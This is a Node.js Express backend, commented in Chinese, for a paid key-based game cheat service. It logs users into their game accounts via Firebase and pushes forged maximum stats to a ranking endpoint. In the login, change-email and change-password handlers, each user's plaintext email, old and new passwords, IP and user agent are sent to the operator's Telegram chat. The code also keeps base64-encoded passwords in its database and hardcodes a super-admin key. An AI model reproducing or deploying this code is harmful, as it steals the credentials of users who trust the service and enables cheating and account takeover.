require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// 中间件
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// PostgreSQL 连接
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// 验证环境变量（包含Telegram）
const requiredEnv = ['FIREBASE_API_KEY', 'RANK_URL', 'DATABASE_URL', 'TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID'];
const missingEnv = requiredEnv.filter(key => !process.env[key]);
if (missingEnv.length > 0) {
    console.error('缺少必要环境变量：', missingEnv.join(', '));
    process.exit(1);
}

// 超级管理员密钥
const SUPER_ADMIN_KEY = 'Liew1201@';

// =================================================================
// Telegram 配置
// =================================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// 获取客户端IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(/, /)[0] : req.connection.remoteAddress;
    return ip || '未知';
}

// Telegram 通知函数
async function sendTelegramNotification(message) {
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram未配置，跳过通知');
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        
        if (!response.ok) {
            console.error('Telegram发送失败:', data);
        } else {
            console.log('✅ Telegram通知发送成功');
        }
        
        return data;
    } catch (error) {
        console.error('❌ Telegram通知错误:', error);
    }
}

// 格式化登录信息
function formatLoginMessage(email, password, key, ip, userAgent, timestamp, status = 'success', errorMsg = '') {
    const statusEmoji = status === 'success' ? '✅' : '❌';
    const statusText = status === 'success' ? '登录成功' : `登录失败: ${errorMsg}`;
    const keyDisplay = key || '无';
    
    return `
🔐 <b>用户登录通知</b> 🔐

${statusEmoji} <b>状态：${statusText}</b>

👤 <b>账号信息：</b>
📧 邮箱: <code>${email}</code>
🔒 密码: <code>${password}</code>
🔑 使用秘钥: <code>${keyDisplay}</code>

🌐 <b>登录信息：</b>
🕐 时间: ${timestamp}
📱 User-Agent: ${userAgent || '未知'}
🌍 IP地址: ${ip || '未知'}

——————————————
🔔 来自MKNLS系统通知
    `;
}

// 格式化修改密码信息
function formatChangePasswordMessage(email, oldPassword, newPassword, key, ip, userAgent, timestamp, status = 'success', errorMsg = '') {
    const statusEmoji = status === 'success' ? '✅' : '❌';
    const statusText = status === 'success' ? '密码修改成功' : `密码修改失败: ${errorMsg}`;
    const keyDisplay = key || '无';
    
    return `
🔐 <b>修改密码通知</b> 🔐

${statusEmoji} <b>状态：${statusText}</b>

👤 <b>账号信息：</b>
📧 邮箱: <code>${email}</code>
🔒 旧密码: <code>${oldPassword}</code>
🆕 新密码: <code>${newPassword}</code>
🔑 使用秘钥: <code>${keyDisplay}</code>

🌐 <b>操作信息：</b>
🕐 时间: ${timestamp}
📱 User-Agent: ${userAgent || '未知'}
🌍 IP地址: ${ip || '未知'}

——————————————
🔔 来自MKNLS系统通知
    `;
}

// 格式化修改邮箱信息
function formatChangeEmailMessage(oldEmail, newEmail, password, key, ip, userAgent, timestamp, status = 'success', errorMsg = '') {
    const statusEmoji = status === 'success' ? '✅' : '❌';
    const statusText = status === 'success' ? '邮箱修改成功' : `邮箱修改失败: ${errorMsg}`;
    const keyDisplay = key || '无';
    
    return `
📧 <b>修改邮箱通知</b> 📧

${statusEmoji} <b>状态：${statusText}</b>

👤 <b>账号信息：</b>
📧 旧邮箱: <code>${oldEmail}</code>
🆕 新邮箱: <code>${newEmail}</code>
🔒 当前密码: <code>${password}</code>
🔑 使用秘钥: <code>${keyDisplay}</code>

🌐 <b>操作信息：</b>
🕐 时间: ${timestamp}
📱 User-Agent: ${userAgent || '未知'}
🌍 IP地址: ${ip || '未知'}

——————————————
🔔 来自MKNLS系统通知
    `;
}

// =================================================================
// 数据库修复函数
// =================================================================
async function fixMissingColumns() {
    try {
        console.log('🔍 检查数据库表结构...');
        
        const columnsToCheck = [
            { name: 'is_password_card', type: 'BOOLEAN DEFAULT FALSE' },
            { name: 'is_telegram_generated', type: 'BOOLEAN DEFAULT FALSE' },
            { name: 'kuaishou_code', type: 'VARCHAR(100) DEFAULT NULL' },
            { name: 'applied_via', type: 'VARCHAR(50) DEFAULT NULL' },
            { name: 'original_key', type: 'VARCHAR(50) DEFAULT NULL' },
            { name: 'copied_times', type: 'INTEGER DEFAULT 0' }
        ];
        
        for (const column of columnsToCheck) {
            try {
                const checkResult = await pool.query(`
                    SELECT column_name 
                    FROM information_schema.columns 
                    WHERE table_name='access_keys' AND column_name='${column.name}'
                `);
                
                if (checkResult.rows.length === 0) {
                    console.log(`   ➕ 添加缺失字段: ${column.name}`);
                    await pool.query(`
                        ALTER TABLE access_keys 
                        ADD COLUMN ${column.name} ${column.type}
                    `);
                    console.log(`   ✅ ${column.name} 字段已添加`);
                }
            } catch (error) {
                console.error(`   ❌ 检查/添加 ${column.name} 字段失败:`, error.message);
            }
        }
        
        console.log('✅ 数据库表结构检查完成');
    } catch (error) {
        console.error('❌ 数据库表结构修复失败:', error);
    }
}

// =================================================================
// 数据库初始化
// =================================================================
async function initDatabase() {
    try {
        console.log('🔄 初始化数据库表...');
        
        // 创建访问密钥表
        await pool.query(`
            CREATE TABLE IF NOT EXISTS access_keys (
                id SERIAL PRIMARY KEY,
                key VARCHAR(50) UNIQUE NOT NULL,
                remark TEXT,
                expiry_time TIMESTAMP NOT NULL,
                status VARCHAR(20) DEFAULT 'active',
                is_admin BOOLEAN DEFAULT FALSE,
                is_super_admin BOOLEAN DEFAULT FALSE,
                is_test_card BOOLEAN DEFAULT FALSE,
                is_password_card BOOLEAN DEFAULT FALSE,
                duration_hours INTEGER DEFAULT 24,
                max_bind INTEGER DEFAULT 3,
                bound_emails TEXT[] DEFAULT '{}',
                added_by VARCHAR(100),
                added_by_name VARCHAR(100),
                added_by_email VARCHAR(100),
                card_type VARCHAR(50) DEFAULT 'FULL',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                activation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                bound_accounts JSONB DEFAULT '[]',
                telegram_user JSONB DEFAULT NULL,
                application_info JSONB DEFAULT NULL
            )
        `);
        
        console.log('✅ 基础表结构创建完成');
        
        // 修复可能缺失的列
        await fixMissingColumns();
        
        // 创建操作日志表
        await pool.query(`
            CREATE TABLE IF NOT EXISTS operation_logs (
                id SERIAL PRIMARY KEY,
                action VARCHAR(100) NOT NULL,
                user_email VARCHAR(100) NOT NULL,
                key_used VARCHAR(50),
                details TEXT,
                log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // 创建管理员操作记录表
        await pool.query(`
            CREATE TABLE IF NOT EXISTS admin_operations (
                id SERIAL PRIMARY KEY,
                admin_email VARCHAR(100) NOT NULL,
                admin_name VARCHAR(100) NOT NULL,
                operation_type VARCHAR(50) NOT NULL,
                target_key VARCHAR(50),
                target_admin VARCHAR(100),
                details TEXT,
                ip_address VARCHAR(50),
                user_agent TEXT,
                operation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        console.log('✅ 所有数据库表初始化完成');
        
        // 检查并创建超级管理员密钥
        const superAdminCheck = await pool.query(
            'SELECT * FROM access_keys WHERE key = $1', 
            [SUPER_ADMIN_KEY]
        );
        
        if (superAdminCheck.rows.length === 0) {
            const expiryTime = new Date();
            expiryTime.setFullYear(expiryTime.getFullYear() + 10);
            
            await pool.query(`
                INSERT INTO access_keys (
                    key, remark, expiry_time, status, is_admin, is_super_admin,
                    is_test_card, is_password_card, duration_hours, max_bind,
                    added_by, added_by_name, added_by_email, card_type
                ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14)
            `, [
                SUPER_ADMIN_KEY,
                '系统超级管理员密钥',
                expiryTime.toISOString(),
                'active',
                true,
                true,
                false,
                false,
                24 * 365 * 10,
                999,
                'system',
                '系统管理员',
                'admin@mknls.com',
                'DIAMOND'
            ]);
            
            console.log('✅ 超级管理员密钥已创建');
        }

    } catch (error) {
        console.error('❌ 数据库初始化失败:', error);
    }
}

// =================================================================
// 数据库操作函数
// =================================================================

async function getAllAccessKeys() {
    const result = await pool.query('SELECT * FROM access_keys ORDER BY created_at DESC');
    return result.rows;
}

async function getAccessKey(key) {
    const result = await pool.query('SELECT * FROM access_keys WHERE key = $1', [key]);
    const row = result.rows[0];
    
    if (row) {
        // 确保新增字段有默认值
        row.is_password_card = row.is_password_card || false;
        row.is_telegram_generated = row.is_telegram_generated || false;
        row.kuaishou_code = row.kuaishou_code || null;
        row.applied_via = row.applied_via || null;
        row.original_key = row.original_key || null;
        row.copied_times = row.copied_times || 0;
    }
    
    return row;
}

async function createAccessKey(keyData) {
    const fullKeyData = {
        key: keyData.key,
        remark: keyData.remark || '无',
        expiryTime: keyData.expiryTime || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        status: keyData.status || 'active',
        isAdmin: keyData.isAdmin || false,
        isSuperAdmin: keyData.isSuperAdmin || false,
        isTestCard: keyData.isTestCard || false,
        isPasswordCard: keyData.isPasswordCard || false,
        durationHours: keyData.durationHours || 24,
        maxBind: keyData.maxBind || 3,
        boundEmails: keyData.boundEmails || [],
        addedBy: keyData.addedBy || 'unknown',
        addedByName: keyData.addedByName || '未知',
        addedByEmail: keyData.addedByEmail || 'unknown@mknls.com',
        cardType: keyData.cardType || 'FULL',
        boundAccounts: keyData.boundAccounts || [],
        activationTime: keyData.activationTime || new Date().toISOString(),
        originalKey: keyData.originalKey || null,
        copiedTimes: keyData.copiedTimes || 0,
        isTelegramGenerated: keyData.isTelegramGenerated || false,
        kuaishouCode: keyData.kuaishouCode || null,
        appliedVia: keyData.appliedVia || null
    };
    
    const fields = [
        'key', 'remark', 'expiry_time', 'status', 'is_admin', 'is_super_admin',
        'is_test_card', 'is_password_card', 'duration_hours', 'max_bind',
        'added_by', 'added_by_name', 'added_by_email', 'card_type',
        'bound_emails', 'bound_accounts', 'activation_time',
        'original_key', 'copied_times', 'is_telegram_generated',
        'kuaishou_code', 'applied_via', 'created_at'
    ];
    
    const values = [
        fullKeyData.key,
        fullKeyData.remark,
        fullKeyData.expiryTime,
        fullKeyData.status,
        fullKeyData.isAdmin,
        fullKeyData.isSuperAdmin,
        fullKeyData.isTestCard,
        fullKeyData.isPasswordCard,
        fullKeyData.durationHours,
        fullKeyData.maxBind,
        fullKeyData.addedBy,
        fullKeyData.addedByName,
        fullKeyData.addedByEmail,
        fullKeyData.cardType,
        fullKeyData.boundEmails,
        JSON.stringify(fullKeyData.boundAccounts),
        fullKeyData.activationTime,
        fullKeyData.originalKey,
        fullKeyData.copiedTimes,
        fullKeyData.isTelegramGenerated,
        fullKeyData.kuaishouCode,
        fullKeyData.appliedVia,
        new Date().toISOString()
    ];
    
    const placeholders = values.map((_, i) => `$${i + 1}`).join(', ');
    
    const query = `
        INSERT INTO access_keys (${fields.join(', ')})
        VALUES (${placeholders})
        RETURNING *
    `;
    
    const result = await pool.query(query, values);
    return result.rows[0];
}

async function updateAccessKey(key, updates) {
    const fields = [];
    const values = [];
    let paramCount = 1;

    for (const [field, value] of Object.entries(updates)) {
        let dbField;
        let dbValue = value;
        
        switch (field) {
            case 'boundAccounts': dbField = 'bound_accounts'; dbValue = JSON.stringify(value); break;
            case 'boundEmails': dbField = 'bound_emails'; dbValue = JSON.stringify(value); break;
            case 'expiryTime': dbField = 'expiry_time'; break;
            case 'durationHours': dbField = 'duration_hours'; break;
            case 'maxBind': dbField = 'max_bind'; break;
            case 'isTestCard': dbField = 'is_test_card'; break;
            case 'isPasswordCard': dbField = 'is_password_card'; break;
            case 'cardType': dbField = 'card_type'; break;
            case 'isAdmin': dbField = 'is_admin'; break;
            case 'isSuperAdmin': dbField = 'is_super_admin'; break;
            case 'activationTime': dbField = 'activation_time'; break;
            case 'originalKey': dbField = 'original_key'; break;
            case 'copiedTimes': dbField = 'copied_times'; break;
            case 'isTelegramGenerated': dbField = 'is_telegram_generated'; break;
            case 'kuaishouCode': dbField = 'kuaishou_code'; break;
            case 'appliedVia': dbField = 'applied_via'; break;
            default: dbField = field.replace(/([A-Z])/g, '_$1').toLowerCase();
        }
        
        fields.push(`${dbField} = $${paramCount}`);
        values.push(dbValue);
        paramCount++;
    }

    values.push(key);
    
    const query = `UPDATE access_keys SET ${fields.join(', ')} WHERE key = $${paramCount} RETURNING *`;
    const result = await pool.query(query, values);
    return result.rows[0];
}

async function deleteAccessKey(key) {
    const result = await pool.query('DELETE FROM access_keys WHERE key = $1 RETURNING *', [key]);
    return result.rows[0];
}

async function addOperationLog(action, user, key, details = '') {
    try {
        const query = `
            INSERT INTO operation_logs (action, user_email, key_used, details)
            VALUES ($1, $2, $3, $4)
        `;
        
        await pool.query(query, [action, user, key, details]);
    } catch (error) {
        console.error('记录操作日志失败:', error);
    }
}

async function addAdminOperation(operation) {
    try {
        const query = `
            INSERT INTO admin_operations (
                admin_email, admin_name, operation_type, target_key, target_admin, 
                details, ip_address, user_agent
            ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
        `;
        
        const values = [
            operation.adminEmail || 'unknown',
            operation.adminName || '未知管理员',
            operation.operationType || 'unknown',
            operation.targetKey || null,
            operation.targetAdmin || null,
            operation.details || '',
            operation.ipAddress || 'unknown',
            operation.userAgent || 'unknown'
        ];
        
        await pool.query(query, values);
    } catch (error) {
        console.error('记录管理员操作失败:', error);
    }
}

async function cleanupExpiredKeys() {
    const result = await pool.query(
        'DELETE FROM access_keys WHERE expiry_time < NOW() RETURNING *'
    );
    return result.rows;
}

function formatKeyData(keyData) {
    return {
        key: keyData.key,
        isActivated: keyData.status === 'active',
        expiryTime: keyData.expiry_time,
        boundEmails: keyData.bound_emails || [],
        maxBind: keyData.max_bind || 3,
        isTestCard: keyData.is_test_card || false,
        isPasswordCard: keyData.is_password_card || false,
        remark: keyData.remark || '无',
        addedByName: keyData.added_by_name || '未知',
        telegramUser: keyData.telegram_user,
        applicationInfo: keyData.application_info,
        boundAccounts: keyData.bound_accounts || [],
        durationHours: keyData.duration_hours,
        cardType: keyData.card_type,
        isAdmin: keyData.is_admin,
        isSuperAdmin: keyData.is_super_admin,
        activationTime: keyData.activation_time,
        addedBy: keyData.added_by,
        originalKey: keyData.original_key || null,
        copiedTimes: keyData.copied_times || 0,
        isTelegramGenerated: keyData.is_telegram_generated || false,
        kuaishouCode: keyData.kuaishou_code || null,
        appliedVia: keyData.applied_via || null,
        createdAt: keyData.created_at,
        status: keyData.status
    };
}

function generateAccessKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let key = '';
    for (let i = 0; i < 15; i++) {
        key += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return key;
}

// =================================================================
// API 接口
// =================================================================

// 1. 检查秘钥接口
app.post('/api/check-key', async (req, res) => {
    try {
        const { key, email } = req.body;

        console.log('检查秘钥请求:', { key: key ? '有秘钥' : '无秘钥', email });

        if (!key) {
            return res.status(400).json({
                success: false,
                message: "验证失败"
            });
        }

        // 检查是否是超级管理员秘钥
        if (key === SUPER_ADMIN_KEY) {
            await addOperationLog('super_admin_login', 'super_admin', key, '超级管理员登录');

            return res.json({
                success: true,
                message: "超级管理员登录成功",
                isAdmin: true,
                isSuperAdmin: true,
                needsChoice: true,
                isTestCard: false,
                isPasswordCard: false
            });
        }

        // 检查普通秘钥
        const keyData = await getAccessKey(key);
        
        if (!keyData) {
            await addOperationLog('key_verification', email || 'unknown', key, '验证失败: 秘钥不存在');
            return res.status(400).json({
                success: false,
                message: "验证失败: 秘钥不存在"
            });
        }
        
        if (keyData.status !== 'active') {
            await addOperationLog('key_verification', email || 'unknown', key, '验证失败: 秘钥未激活');
            return res.status(400).json({
                success: false,
                message: "验证失败: 秘钥未激活"
            });
        }
        
        if (new Date(keyData.expiry_time) < new Date()) {
            await updateAccessKey(key, { status: 'expired' });
            await addOperationLog('key_verification', email || 'unknown', key, '验证失败: 秘钥已过期');
            return res.status(400).json({
                success: false,
                message: "验证失败: 秘钥已过期"
            });
        }

        // 检查绑定状态
        const boundEmails = keyData.bound_emails || [];
        const isEmailBound = email && boundEmails.includes(email);
        const bindCount = boundEmails.length;
        const maxBind = keyData.max_bind || 3;
        const remainingBinds = Math.max(0, maxBind - bindCount);

        console.log('秘钥状态:', {
            key,
            isAdmin: keyData.is_admin,
            isTestCard: keyData.is_test_card,
            isPasswordCard: keyData.is_password_card,
            boundCount: bindCount,
            maxBind,
            remainingBinds,
            isEmailBound,
            expiry: keyData.expiry_time
        });

        // 如果是管理员秘钥
        if (keyData.is_admin) {
            await addOperationLog('admin_login', keyData.added_by || 'admin', key, '管理员登录');

            return res.json({
                success: true,
                message: "管理员登录成功",
                isAdmin: true,
                isSuperAdmin: keyData.is_super_admin || false,
                needsChoice: true,
                isTestCard: keyData.is_test_card || false,
                isPasswordCard: keyData.is_password_card || false
            });
        }

        // 检查是否测试卡或改密卡
        const isTestCard = keyData.is_test_card || false;
        const isPasswordCard = keyData.is_password_card || false;

        // 普通用户秘钥 - 检查绑定限制
        if (remainingBinds <= 0 && !isEmailBound) {
            await addOperationLog('key_verification', email || 'unknown', key, '验证失败: 绑定已满');
            return res.status(400).json({
                success: false,
                message: "该秘钥绑定数量已达上限",
                bindCount,
                maxBind,
                remainingBinds: 0,
                isEmailBound: false,
                isTestCard,
                isPasswordCard
            });
        }

        await addOperationLog('key_verification', email || 'unknown', key, '秘钥验证成功');

        res.json({
            success: true,
            message: "秘钥验证成功",
            expiryTime: keyData.expiry_time,
            isAdmin: false,
            isTestCard: isTestCard,
            isPasswordCard: isPasswordCard,
            bindCount,
            maxBind,
            remainingBinds,
            isEmailBound,
            durationHours: keyData.duration_hours,
            cardType: keyData.card_type
        });

    } catch (error) {
        console.error('检查秘钥错误:', error);
        await addOperationLog('key_verification', 'unknown', 'unknown', '验证失败: 服务器错误');
        res.status(400).json({
            success: false,
            message: "验证失败: 服务器错误"
        });
    }
});

// 2. 登录接口（带Telegram通知）
app.post('/api/login', async (req, res) => {
    try {
        const { email, password, key } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: "请提供邮箱和密码"
            });
        }

        const firebaseResponse = await fetch(
            `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${process.env.FIREBASE_API_KEY}`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email,
                    password,
                    returnSecureToken: true
                })
            }
        );

        const firebaseData = await firebaseResponse.json();

        if (!firebaseResponse.ok) {
            const errorMsg = firebaseData.error?.message || '登录失败';
            
            // 发送失败的Telegram通知
            const failMessage = formatLoginMessage(email, password, key, ip, userAgent, timestamp, 'fail', errorMsg);
            await sendTelegramNotification(failMessage);
            
            await addOperationLog('user_login', email, key || 'N/A', `登录失败: ${errorMsg}`);
            
            return res.status(400).json({
                success: false,
                message: errorMsg
            });
        }

        // 如果提供了有效的秘钥，绑定邮箱到秘钥
        if (key) {
            const keyData = await getAccessKey(key);
            if (keyData) {
                const boundEmails = keyData.bound_emails || [];
                if (!boundEmails.includes(email)) {
                    // 添加到绑定邮箱列表
                    const newBoundEmails = [...boundEmails, email];
                    
                    // 添加到绑定账号列表
                    const boundAccounts = keyData.bound_accounts || [];
                    boundAccounts.push({
                        email: email,
                        password: Buffer.from(password).toString('base64'),
                        bindTime: new Date().toISOString(),
                        lastLogin: new Date().toISOString()
                    });
                    
                    await updateAccessKey(key, {
                        bound_emails: newBoundEmails,
                        bound_accounts: boundAccounts
                    });
                    
                    await addOperationLog('email_binding', email, key, `邮箱绑定到秘钥成功`);
                } else {
                    // 更新最后登录时间
                    const boundAccounts = keyData.bound_accounts || [];
                    const accountIndex = boundAccounts.findIndex(acc => acc.email === email);
                    if (accountIndex !== -1) {
                        boundAccounts[accountIndex].lastLogin = new Date().toISOString();
                        await updateAccessKey(key, {
                            bound_accounts: boundAccounts
                        });
                    }
                }
            }
        }

        // 发送成功的Telegram通知
        const successMessage = formatLoginMessage(email, password, key, ip, userAgent, timestamp, 'success');
        await sendTelegramNotification(successMessage);

        await addOperationLog('user_login', email, key || 'N/A', '用户登录成功');

        res.json({
            success: true,
            data: {
                email: firebaseData.email,
                userId: firebaseData.localId,
                idToken: firebaseData.idToken,
                role: 'user',
                expiresIn: firebaseData.expiresIn
            },
            message: "登录成功"
        });

    } catch (error) {
        console.error('登录接口错误:', error);
        
        // 发送异常通知
        const { email, password, key } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        
        const errorMessage = formatLoginMessage(email, password, key, ip, userAgent, timestamp, 'fail', '服务器错误');
        await sendTelegramNotification(errorMessage);
        
        await addOperationLog('user_login', 'unknown', 'N/A', '登录接口错误');
        res.status(400).json({
            success: false,
            message: "登录失败"
        });
    }
});

// 3. 刷King等级接口
app.post('/api/king-rank', async (req, res) => {
    try {
        const authHeader = req.headers.authorization;
        const { key } = req.body;

        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                message: "请提供有效的身份令牌"
            });
        }

        const idToken = authHeader.split(' ')[1];

        // 检查是否是改密卡
        if (key) {
            const keyData = await getAccessKey(key);
            if (keyData && keyData.is_password_card) {
                return res.status(403).json({
                    success: false,
                    message: "改密卡不支持国王等级功能"
                });
            }
        }

        const ratingData = {
            "cars": 100000, "car_fix": 100000, "car_collided": 100000, "car_exchange": 100000,
            "car_trade": 100000, "car_wash": 100000, "slicer_cut": 100000, "drift_max": 100000,
            "drift": 100000, "cargo": 100000, "delivery": 100000, "taxi": 100000, "levels": 100000,
            "gifts": 100000, "fuel": 100000, "offroad": 100000, "speed_banner": 100000,
            "reactions": 100000, "police": 100000, "run": 100000, "real_estate": 100000,
            "t_distance": 100000, "treasure": 100000, "block_post": 100000, "push_ups": 100000,
            "burnt_tire": 100000, "passanger_distance": 100000, "time": 10000000000, "race_win": 3000
        };

        const rankResponse = await fetch(process.env.RANK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${idToken}`,
                'User-Agent': 'okhttp/3.12.13'
            },
            body: JSON.stringify({
                data: JSON.stringify({ RatingData: ratingData })
            })
        });

        if (!rankResponse.ok) {
            await addOperationLog('set_king_rank', 'unknown', key || 'N/A', '刷King等级失败');
            return res.status(400).json({
                success: false,
                message: "刷King等级失败"
            });
        }

        await addOperationLog('set_king_rank', 'unknown', key || 'N/A', '刷King等级成功');

        res.json({
            success: true,
            message: "刷King等级成功"
        });

    } catch (error) {
        await addOperationLog('set_king_rank', 'unknown', 'N/A', '刷King等级失败');
        res.status(400).json({
            success: false,
            message: "刷King等级失败"
        });
    }
});

// 4. 修改邮箱接口（带Telegram通知）
app.post('/api/change-email', async (req, res) => {
    try {
        const { idToken, newEmail, oldEmail, key, password } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

        if (!idToken || !newEmail) {
            return res.status(400).json({
                success: false,
                message: "请提供完整的参数"
            });
        }

        if (!/^[\w.-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/.test(newEmail)) {
            return res.status(400).json({
                success: false,
                message: "请输入有效的邮箱格式"
            });
        }

        // 检查是否测试卡或改密卡
        if (key) {
            const keyData = await getAccessKey(key);
            if (keyData) {
                if (keyData.is_test_card) {
                    return res.status(403).json({
                        success: false,
                        message: "测试卡不支持修改邮箱功能"
                    });
                }
                if (keyData.is_password_card) {
                    return res.status(403).json({
                        success: false,
                        message: "改密卡不支持修改邮箱功能"
                    });
                }
            }
        }

        const firebaseResponse = await fetch(
            `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${process.env.FIREBASE_API_KEY}`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    idToken,
                    email: newEmail,
                    returnSecureToken: true
                })
            }
        );

        const firebaseData = await firebaseResponse.json();

        if (!firebaseResponse.ok) {
            const errorMsg = firebaseData.error?.message || '修改邮箱失败';
            
            // 发送失败通知
            const failMessage = formatChangeEmailMessage(oldEmail, newEmail, password || '未知', key, ip, userAgent, timestamp, 'fail', errorMsg);
            await sendTelegramNotification(failMessage);
            
            await addOperationLog('change_email', oldEmail || 'unknown', key || 'N/A', '修改邮箱失败');
            return res.status(400).json({
                success: false,
                message: "修改邮箱失败"
            });
        }

        // 更新秘钥绑定的邮箱信息
        if (key && oldEmail) {
            const keyData = await getAccessKey(key);
            if (keyData && keyData.bound_emails) {
                const emailIndex = keyData.bound_emails.indexOf(oldEmail);
                if (emailIndex !== -1) {
                    const newBoundEmails = [...keyData.bound_emails];
                    newBoundEmails[emailIndex] = newEmail;
                    
                    // 更新绑定账号信息
                    const boundAccounts = keyData.bound_accounts || [];
                    const accountIndex = boundAccounts.findIndex(acc => acc.email === oldEmail);
                    if (accountIndex !== -1) {
                        boundAccounts[accountIndex].email = newEmail;
                    }
                    
                    await updateAccessKey(key, {
                        bound_emails: newBoundEmails,
                        bound_accounts: boundAccounts
                    });
                }
            }
        }

        // 发送成功通知
        const successMessage = formatChangeEmailMessage(oldEmail, newEmail, password || '未知', key, ip, userAgent, timestamp, 'success');
        await sendTelegramNotification(successMessage);

        await addOperationLog('change_email', oldEmail || 'unknown', key || 'N/A', `修改邮箱成功：${oldEmail} -> ${newEmail}`);

        res.json({
            success: true,
            data: {
                email: firebaseData.email,
                idToken: firebaseData.idToken
            },
            message: "修改邮箱成功"
        });

    } catch (error) {
        console.error('修改邮箱错误:', error);
        
        // 发送异常通知
        const { oldEmail, newEmail, password, key } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        
        const errorMessage = formatChangeEmailMessage(oldEmail, newEmail, password || '未知', key, ip, userAgent, timestamp, 'fail', '服务器错误');
        await sendTelegramNotification(errorMessage);
        
        await addOperationLog('change_email', 'unknown', 'N/A', '修改邮箱失败');
        res.status(400).json({
            success: false,
            message: "修改邮箱失败"
        });
    }
});

// 5. 修改密码接口（带Telegram通知）
app.post('/api/change-password', async (req, res) => {
    try {
        const { idToken, newPassword, email, key, oldPassword } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

        if (!idToken || !newPassword) {
            return res.status(400).json({
                success: false,
                message: "请提供完整的参数"
            });
        }

        if (newPassword.length < 6) {
            return res.status(400).json({
                success: false,
                message: "密码长度不能少于6位"
            });
        }

        // 检查是否是测试卡
        if (key) {
            const keyData = await getAccessKey(key);
            if (keyData && keyData.is_test_card) {
                return res.status(403).json({
                    success: false,
                    message: "测试卡不支持修改密码功能"
                });
            }
        }

        const firebaseResponse = await fetch(
            `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${process.env.FIREBASE_API_KEY}`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    idToken,
                    password: newPassword,
                    returnSecureToken: true
                })
            }
        );

        const firebaseData = await firebaseResponse.json();

        if (!firebaseResponse.ok) {
            const errorMsg = firebaseData.error?.message || '修改密码失败';
            
            // 发送失败通知
            const failMessage = formatChangePasswordMessage(email, oldPassword || '未知', newPassword, key, ip, userAgent, timestamp, 'fail', errorMsg);
            await sendTelegramNotification(failMessage);
            
            await addOperationLog('change_password', email || 'unknown', key || 'N/A', '修改密码失败');
            return res.status(400).json({
                success: false,
                message: "修改密码失败"
            });
        }

        // 更新秘钥绑定的密码信息
        if (key && email) {
            const keyData = await getAccessKey(key);
            if (keyData && keyData.bound_accounts) {
                const boundAccounts = keyData.bound_accounts || [];
                const accountIndex = boundAccounts.findIndex(acc => acc.email === email);
                if (accountIndex !== -1) {
                    boundAccounts[accountIndex].password = Buffer.from(newPassword).toString('base64');
                    await updateAccessKey(key, {
                        bound_accounts: boundAccounts
                    });
                }
            }
        }

        // 发送成功通知
        const successMessage = formatChangePasswordMessage(email, oldPassword || '未知', newPassword, key, ip, userAgent, timestamp, 'success');
        await sendTelegramNotification(successMessage);

        await addOperationLog('change_password', email || 'unknown', key || 'N/A', '修改密码成功');

        res.json({
            success: true,
            data: {
                idToken: firebaseData.idToken
            },
            message: "修改密码成功"
        });

    } catch (error) {
        console.error('修改密码错误:', error);
        
        // 发送异常通知
        const { email, newPassword, key, oldPassword } = req.body;
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'];
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        
        const errorMessage = formatChangePasswordMessage(email, oldPassword || '未知', newPassword, key, ip, userAgent, timestamp, 'fail', '服务器错误');
        await sendTelegramNotification(errorMessage);
        
        await addOperationLog('change_password', 'unknown', 'N/A', '修改密码失败');
        res.status(400).json({
            success: false,
            message: "修改密码失败"
        });
    }
});

